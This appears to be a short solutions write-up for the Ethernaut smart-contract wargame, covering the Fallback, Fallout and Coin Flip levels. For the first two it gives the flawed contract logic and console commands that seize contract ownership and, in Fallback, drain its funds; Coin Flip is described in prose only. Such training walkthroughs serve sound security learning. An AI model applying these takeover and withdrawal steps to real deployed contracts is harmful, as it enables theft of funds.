# Ethernaut Solutions

## Level 1 - Fallback

Exploiting faulty logic that allows taking posession of the contract. 

```
  // 'fallback' function sets contract owner to msg.sender
  // can be used to take control of the contract
  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```

By satisfying the condition in the fallback function, the contract can be hijacked.

```
// Get current contract owner
await contract.owner();

await contract.contribute({ value: 1 });
// use the sendTransaction function to make a call to the contract

// trigger the fallback by sending Ether with no msg.data
await contract.sendTransaction({ value: 1 });

// Get current contract owner (should be your address now)
await contract.owner();

// Call the withdraw function and drain the funds
await contract.withdraw();
```

## Level 2 - Fallout

The contract does not correctly supply a constructor function. Instead a publicly callable function is set that allows anyone to call the function and take ownership of the contract.

```
// Get current contract owner
await contract.owner();

// Call the Fal1out() function
await contract.Fal1out();

// Get current contract owner
await contract.owner();
```

## Level 3 - Coin Flip

The contract attempts to generate randomness via blockhash and a state variable to determine the outcome of a coin flip. The problem is that it is possible to calculate in advance what the outcome of the 'random' flip will be with the given inputs to the coinFlip function. By deploying a custom contract that conditionally calls the target contract's flip() function only when the expected outcome matches the desired result, the goal of reaching 10 consecutive wins is possible.

